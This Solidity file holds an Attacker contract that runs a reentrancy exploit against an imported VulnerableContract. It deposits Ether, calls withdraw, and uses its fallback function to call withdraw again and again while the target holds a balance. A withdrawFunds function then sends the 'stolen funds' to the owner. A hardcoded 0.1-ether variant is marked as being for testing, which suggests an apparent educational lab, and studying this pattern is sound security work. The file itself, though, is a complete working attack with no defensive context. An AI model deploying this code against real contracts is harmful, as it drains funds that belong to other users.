// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./VulnerableContract.sol";

contract Attacker {
    
    VulnerableContract public vulnerable;
    address public owner;
    uint256 public attackAmount;

    event FallbackTriggered(uint256 balance);

    constructor(address _vulnerableAddress) {
        vulnerable = VulnerableContract(_vulnerableAddress);
        owner = msg.sender;
    }

    // Fallback function to perform the reentrancy attack
    fallback() external payable {
        emit FallbackTriggered(address(this).balance);

        if (address(vulnerable).balance >= attackAmount) {
            vulnerable.withdraw(attackAmount);  // Recursive call
        }
    }

    // Function to initiate the attack
    function attack(uint256 _amount) external payable {
        attackAmount = _amount;
        vulnerable.deposit{value: _amount}();  // Deposit Ether to the vulnerable contract
        vulnerable.withdraw(_amount);  // Start reentrancy attack
    }
    

    function attack() external payable {
        attackAmount = 0.1 ether;  // Hardcoded for testing
        vulnerable.deposit{value: 0.1 ether}();
        vulnerable.withdraw(0.1 ether);
    }


    // Function to withdraw stolen funds
    function withdrawFunds() external {
        require(msg.sender == owner, "Only owner can withdraw");
        payable(owner).transfer(address(this).balance);
    }

    // Function to check the balance of the attacker contract
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

}
